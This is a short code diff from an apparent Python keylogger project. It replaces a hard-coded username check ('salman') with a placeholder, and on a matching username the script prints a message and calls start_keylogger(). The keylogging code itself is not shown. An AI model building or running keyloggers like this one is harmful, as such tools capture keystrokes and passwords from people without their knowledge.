@@ -87,7 +87,7 @@ def start_keylogger():
 if __name__ == "__main__":
     print(">>> Entered __main__ block")
     username = input("Enter username: ")
-    if username.strip().lower() == "salman":
+    if username.strip().lower() == "put_your_desired_username_value":
         print("Access granted. Starting keylogger...")
         start_keylogger()
     else:
